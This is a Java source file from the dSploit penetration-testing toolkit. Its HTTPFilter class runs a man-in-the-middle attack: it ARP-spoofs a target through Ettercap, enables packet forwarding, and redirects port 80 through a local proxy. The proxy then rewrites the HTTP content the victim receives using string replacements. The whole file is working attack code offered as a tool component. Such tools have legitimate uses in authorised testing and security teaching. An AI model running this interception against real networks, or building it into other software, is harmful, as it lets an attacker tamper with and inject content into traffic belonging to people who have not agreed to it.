/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.util.ArrayList;

import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.net.http.proxy.Proxy;
import it.evilsocket.dsploit.net.http.proxy.Proxy.ProxyFilter;
import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;


public class HTTPFilter 
{
	public static void start( final Proxy proxy, final ProxyFilter filter ) {
		System.getEttercap().spoof( System.getCurrentTarget(), new OnReadyListener(){
			@Override
			public void onReady() 
			{
				System.setForwarding( true );
				
				proxy.setFilter( filter );
				
				new Thread( proxy ).start();
				
				System.getIPTables().portRedirect( 80, System.HTTP_PROXY_PORT );									
			}
			
		}).start();				
	}
	
	public static void start( final Proxy proxy, final String from, final String to ) {
		start( proxy, new ProxyFilter() 
		{					
			@Override
			public String onDataReceived( String headers, String data ) {
				return data.replaceAll( from, to );
			}
		});			
	}
	
	public static void start( final Proxy proxy, final ArrayList<String> from, final ArrayList<String> to ) {
		start( proxy, new ProxyFilter() 
		{					
			@Override
			public String onDataReceived( String headers, String data ) {
				for( int i = 0; i < from.size(); i++ )
				{
					data = data.replaceAll( from.get( i ), to.get( i ) );
				}
				
				return data;
			}
		});		
	}
	
	public static void stop( Proxy proxy ){
		System.getEttercap().kill();
		System.getIPTables().undoPortRedirect( 80, System.HTTP_PROXY_PORT );
		proxy.stop();
		System.setForwarding( false );
	}
}
